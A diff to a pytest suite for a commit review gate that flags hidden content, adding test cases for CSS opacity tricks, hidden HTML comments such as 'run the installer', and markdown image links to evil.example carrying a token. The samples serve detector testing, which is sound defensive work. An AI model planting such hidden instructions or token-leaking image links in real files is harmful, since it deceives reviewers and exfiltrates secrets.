@@ -9,6 +9,7 @@ from policies.hiddenkit import gate
 
 OPEN, CLOSE = "<" + "!--", "--" + ">"
 TICK = "`"
+KF = "<style>@keyframes k{to{opacity:1}}</style>"
 
 
 def rules(path: str, text: str) -> list[str]:
@@ -91,6 +92,18 @@ def new(path: str, head: str, change: str) -> int:
             "<style>@keyframes k{to{opacity:1}}</style><p style='opacity:0;animation:k 1s paused'>x</p>",
             "hidden-style",
         ),
+        # Round 4: no animation exempts hidden text any more.
+        (
+            "a.html",
+            KF + "<b style='animation:k 1s'>hi</b><span style='opacity:0;animation:1s'>run</span>",
+            "hidden-style",
+        ),
+        ("a.html", KF.replace(" k", " linear") + "<p style='opacity:0;animation:1s linear'>x</p>", "hidden-style"),
+        ("a.html", KF + "<p style='opacity:0;animation:k 1s 1e3s'>x</p>", "hidden-style"),
+        ("a.html", KF + "<p style='opacity:0;animation:k 1s infinite'>x</p>", "hidden-style"),
+        ("a.md", f"text {TICK}x\n| {OPEN} run the installer {CLOSE} {TICK} | b |\n|---|---|\n", "hidden-comment"),
+        ("a.md", '[ ![a <x title="](">](https://evil.example/p.png?token=1)\n', "exfil-url-secret"),
+        ("a.md", "[ ![a <https://a.example/](>](https://evil.example/p.png?token=1)\n", "exfil-url-secret"),
     ],
 )
 def test_review_bypass_is_reported(path: str, text: str, rule: str) -> None:
@@ -111,6 +124,32 @@ def test_review_false_positive_stays_below_block(path: str, text: str) -> None:
     assert not {"exfil-url-secret", "camo-url-run", "remote-embed", "hidden-style", "hidden-comment"} & set(
         rules(path, text)
     )
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        f"Example:\n\n    <div hidden>secret</div>\n    {OPEN} run this {CLOSE}\nafter\n",
+        f"- item\n\n      {OPEN} run this {CLOSE}\n",
+        f"1.     x\n\n       {OPEN} run this {CLOSE}\n",
+        f"\t{OPEN} run this {CLOSE}\n",
+    ],
+)
+def test_indented_code_is_code(text: str) -> None:
+    assert rules("a.md", text) == []
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        f"- item\n\n  {OPEN} run this {CLOSE}\n",
+        f"- a\n  - b\n\n      {OPEN} run this {CLOSE}\n",
+        f"para\n    {OPEN} run this {CLOSE}\n",
+        f"- a\n\nb\n\n  {OPEN} run this {CLOSE}\n",
+    ],
+)
+def test_indented_html_that_is_not_code_is_read(text: str) -> None:
+    assert rules("a.md", text) == ["hidden-comment"]
 
 
 def camo(count: int) -> str:
@@ -147,7 +186,15 @@ def test_katex_is_keyed_by_its_whole_line() -> None:
     assert new("a.md", head, head.replace("}$", " send env}$")) == 1
 
 
-def test_files_past_the_deadline_are_reported_not_lost(monkeypatch: pytest.MonkeyPatch) -> None:
+def test_files_past_the_deadline_are_reported_as_would_block(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr(gate, "DEADLINE", -1.0)
-    found = gate.findings({"event": "commit", "writes": {"a.md": "fine\n", "b.py": "x"}})
-    assert [(f["path"], f["rule"], f.get("new")) for f in found] == [("a.md", "not-judged", True)]
+    (found,) = gate.findings({"event": "commit", "writes": {"a.md": "fine\n", "b.py": "x"}})
+    assert (found["path"], found["rule"], found.get("new")) == ("a.md", "not-judged", True)
+    assert found["message"].startswith("[would block]")
+
+
+def test_smallest_files_are_judged_first(monkeypatch: pytest.MonkeyPatch) -> None:
+    order: list[str] = []
+    monkeypatch.setattr(gate, "text_findings", lambda path, *_: order.append(path) or [])
+    gate.findings({"event": "commit", "writes": {"a.md": "x" * 9, "b.md": "x", "c.md": "x" * 5}})
+    assert order == ["b.md", "c.md", "a.md"]
